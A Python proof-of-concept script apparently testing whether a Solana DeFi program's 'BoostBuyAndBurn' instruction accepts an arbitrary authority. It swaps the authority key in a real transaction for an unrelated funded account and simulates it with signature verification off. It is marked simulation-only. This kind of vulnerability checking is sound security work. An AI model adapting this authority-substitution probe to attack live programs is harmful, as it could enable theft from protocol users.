#!/usr/bin/env python3
import base64
import json
import time
import boost_runtime_scan as core

PROGRAM = core.PROGRAM
GLOBAL_CONFIG = "ADyA8hdefvWN2dbGGWFotbzWxrAvLW83WG6QCVXvJKqw"
BASELINE_SIGNATURE = "2miN1VAguLkvXX71cUyVKWhppjRmnuf36kwKCFwoYL1uxLNZDvuXpF7JAcacTSt4gneG9ZachaXHekzQtABtjUGT"
SYSTEM_PROGRAM = "11111111111111111111111111111111"


def shortvec(buf, off):
    value = 0
    shift = 0
    while True:
        b = buf[off]
        off += 1
        value |= (b & 0x7F) << shift
        if not (b & 0x80):
            return value, off
        shift += 7
        if shift > 28:
            raise ValueError("invalid shortvec")


def first_static_key_offset(serialized):
    sig_count, off = shortvec(serialized, 0)
    off += sig_count * 64
    msg_start = off
    if serialized[msg_start] & 0x80:
        # Versioned message prefix (0x80 | version), followed by 3-byte header.
        header = msg_start + 1
    else:
        # Legacy message starts directly with 3-byte header.
        header = msg_start
    key_count, key_off = shortvec(serialized, header + 3)
    if key_count < 1:
        raise ValueError("transaction has no static account keys")
    return key_off, sig_count, key_count


def target_instruction_info(tx):
    keys = core.all_keys(tx)
    for layer, pos, ix in core.instruction_stream(tx):
        if "programIdIndex" not in ix or "data" not in ix:
            continue
        if keys[ix["programIdIndex"]] != PROGRAM:
            continue
        try:
            raw = core.b58decode(ix["data"])
        except Exception:
            continue
        if raw[:8] != core.TARGET:
            continue
        return {
            "layer": layer,
            "position": pos,
            "authority_message_index": ix["accounts"][1],
            "authority": keys[ix["accounts"][1]],
            "pool": keys[ix["accounts"][0]],
            "global_config": keys[ix["accounts"][2]],
        }
    return None


def pick_arbitrary_funded_payer(url, forbidden):
    sigs = core.rpc_single(url, "getSignaturesForAddress", [PROGRAM, {
        "limit": 80,
        "commitment": "finalized",
    }]) or []
    candidates = [x["signature"] for x in sigs if x.get("err") is None]
    for start in range(0, len(candidates), 20):
        chunk = candidates[start:start+20]
        calls = [("getTransaction", [sig, {
            "encoding":"json",
            "commitment":"finalized",
            "maxSupportedTransactionVersion":0,
        }]) for sig in chunk]
        try:
            txs = core.rpc_batch(url, calls)
        except Exception:
            txs = []
            for sig in chunk:
                try:
                    txs.append(core.rpc_single(url, "getTransaction", [sig, {
                        "encoding":"json", "commitment":"finalized", "maxSupportedTransactionVersion":0,
                    }]))
                except Exception:
                    txs.append(None)
                time.sleep(0.05)
        for sig, tx in zip(chunk, txs):
            if not tx or not tx.get("transaction"):
                continue
            keys = tx["transaction"]["message"].get("accountKeys", [])
            if not keys:
                continue
            payer = keys[0]
            if payer in forbidden:
                continue
            try:
                info = core.rpc_single(url, "getAccountInfo", [payer, {"encoding":"base64","commitment":"finalized"}])
            except Exception:
                continue
            value = (info or {}).get("value")
            if not value:
                continue
            if value.get("owner") != SYSTEM_PROGRAM:
                continue
            if int(value.get("lamports", 0)) < 2_000_000:
                continue
            return {
                "pubkey": payer,
                "lamports": value.get("lamports"),
                "owner": value.get("owner"),
                "source_signature": sig,
            }
    raise RuntimeError("could not find an unrelated funded system-account fee payer")


def simulate(url, raw_bytes):
    encoded = base64.b64encode(raw_bytes).decode()
    return core.rpc_single(url, "simulateTransaction", [encoded, {
        "encoding": "base64",
        "sigVerify": False,
        "replaceRecentBlockhash": True,
        "commitment": "processed",
    }])


def summarize_sim(sim):
    value = sim.get("value") if isinstance(sim, dict) else None
    if value is None:
        return {"rpc_result": sim}
    logs = value.get("logs") or []
    joined = "\n".join(logs)
    saw_instruction = "Instruction: BoostBuyAndBurn" in joined
    program_success = f"Program {PROGRAM} success" in joined
    program_failed = f"Program {PROGRAM} failed" in joined
    constraint_address = "ConstraintAddress" in joined or "A raw constraint was violated" in joined
    anchor_error = "AnchorError" in joined
    return {
        "err": value.get("err"),
        "units_consumed": value.get("unitsConsumed"),
        "saw_boost_instruction": saw_instruction,
        "pump_program_success_log_present": program_success,
        "pump_program_failed_log_present": program_failed,
        "constraint_address_log_present": constraint_address,
        "anchor_error_log_present": anchor_error,
        "logs": logs,
    }


def main():
    url = core.choose_rpc()
    current = core.decode_current_boost_authority(url, GLOBAL_CONFIG)
    expected = current.get("boost_authority")
    print("CURRENT_GLOBAL_CONFIG", json.dumps(current, indent=2, sort_keys=True), flush=True)

    baseline_json = core.rpc_single(url, "getTransaction", [BASELINE_SIGNATURE, {
        "encoding":"json",
        "commitment":"finalized",
        "maxSupportedTransactionVersion":0,
    }])
    target = target_instruction_info(baseline_json)
    if not target:
        raise SystemExit("baseline transaction no longer decodes as boost_buy_and_burn")
    print("BASELINE_TARGET", json.dumps(target, indent=2, sort_keys=True), flush=True)
    if target["authority_message_index"] != 0:
        raise SystemExit(f"expected authority at message index 0, got {target['authority_message_index']}")
    if target["authority"] != expected:
        raise SystemExit(f"baseline authority {target['authority']} != current boost_authority {expected}")

    baseline_raw_resp = core.rpc_single(url, "getTransaction", [BASELINE_SIGNATURE, {
        "encoding":"base64",
        "commitment":"finalized",
        "maxSupportedTransactionVersion":0,
    }])
    raw = bytearray(base64.b64decode(baseline_raw_resp["transaction"][0]))
    key_off, sig_count, key_count = first_static_key_offset(raw)
    first_key = core.b58encode(bytes(raw[key_off:key_off+32]))
    print(f"RAW_LAYOUT signatures={sig_count} static_keys={key_count} first_key={first_key}", flush=True)
    if first_key != expected:
        raise SystemExit(f"raw first static key {first_key} != expected authority {expected}")

    arbitrary = pick_arbitrary_funded_payer(url, {expected, GLOBAL_CONFIG, PROGRAM})
    print("ARBITRARY_EXISTING_SIGNER", json.dumps(arbitrary, indent=2, sort_keys=True), flush=True)

    baseline_sim = summarize_sim(simulate(url, bytes(raw)))
    print("BASELINE_SIMULATION", json.dumps(baseline_sim, indent=2, sort_keys=True), flush=True)

    mutated = bytearray(raw)
    replacement = core.b58decode(arbitrary["pubkey"])
    if len(replacement) != 32:
        raise SystemExit("replacement pubkey did not decode to 32 bytes")
    mutated[key_off:key_off+32] = replacement
    mutated_sim = summarize_sim(simulate(url, bytes(mutated)))
    print("MUTATED_AUTHORITY_SIMULATION", json.dumps(mutated_sim, indent=2, sort_keys=True), flush=True)

    accepted = bool(mutated_sim.get("saw_boost_instruction") and mutated_sim.get("pump_program_success_log_present"))
    rejected_by_address = bool(mutated_sim.get("constraint_address_log_present"))
    if accepted:
        verdict = "ARBITRARY_AUTHORITY_ACCEPTED_BY_PUMPSWAP"
    elif rejected_by_address:
        verdict = "ARBITRARY_AUTHORITY_REJECTED_CONSTRAINT_ADDRESS"
    elif mutated_sim.get("pump_program_failed_log_present"):
        verdict = "ARBITRARY_AUTHORITY_REJECTED_OTHER_RUNTIME_CHECK"
    else:
        verdict = "INCONCLUSIVE_BEFORE_PUMPSWAP_COMPLETION"

    result = {
        "verdict": verdict,
        "baseline_signature": BASELINE_SIGNATURE,
        "baseline_target": target,
        "current_global_config": current,
        "replacement_account": arbitrary,
        "baseline_simulation": baseline_sim,
        "mutated_authority_simulation": mutated_sim,
        "broadcast_performed": False,
        "simulation_only": True,
    }
    print("FINAL_VERDICT", verdict, flush=True)
    with open("boost_mutated_authority_sim_result.json", "w") as f:
        json.dump(result, f, indent=2, sort_keys=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
